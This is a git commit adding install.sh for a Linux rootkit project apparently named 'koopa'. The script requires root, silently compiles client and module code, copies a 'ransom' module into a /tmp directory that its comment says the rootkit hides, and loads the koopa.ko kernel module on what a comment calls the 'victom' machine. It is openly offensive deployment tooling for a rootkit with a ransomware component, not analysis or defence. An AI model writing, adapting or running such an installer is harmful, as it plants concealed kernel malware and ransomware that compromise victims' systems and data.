1c9ea06d0244617bad3218541f0c159da2d90419
K5 <jordanjjana@gmail.com>
2023-07-04 21:20:29 +0100

    hello world

---
+++ install.sh
@@ -0,0 +1,23 @@
+#!/bin/bash
+if (( $EUID != 0 )); then
+    echo "Please use sudo or run as root"
+    exit
+fi
+
+# You need to have compiled koopa.ko by now, either on the victom or a machine with the same header files
+cd client &> /dev/zero
+make &> /dev/zero
+cd ../modules &> /dev/zero
+make &> /dev/zero
+cd .. &> /dev/zero
+mkdir /tmp/koopa &> /dev/zero #secret dir for umbra, hidden by the rootkit
+cp modules/ransom /tmp/koopa &> /dev/zero
+
+cd kernel &> /dev/zero
+insmod ./koopa.ko
+
+if [[ $(lsmod | grep koopa) = *koopa* ]]; then
+    echo "Install success"
+else
+    echo "Install fail"
+fi
